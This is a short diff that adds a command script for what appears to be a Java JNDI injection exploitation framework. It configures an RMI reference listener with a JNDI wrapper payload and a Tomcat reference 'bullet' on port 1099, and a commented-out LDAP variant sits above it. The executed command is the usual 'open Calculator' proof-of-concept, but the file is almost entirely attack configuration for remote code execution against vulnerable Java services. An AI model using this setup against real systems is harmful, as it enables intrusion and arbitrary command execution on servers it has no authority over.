@@ -1,0 +1,15 @@
+# 使用ldap://
+#use exploit LDAPTomcatRefListener
+#set lport 1099
+#set command "open -a Calculator.app"
+#run
+
+# rmi://
+use exploit RMIRefListener
+use payload JNDIRefWrapper
+use bullet TomcatRefBullet
+set lhost 127.0.0.1
+set lport 1099
+set objectName Obj
+set command "open -a Calculator.app"
+run
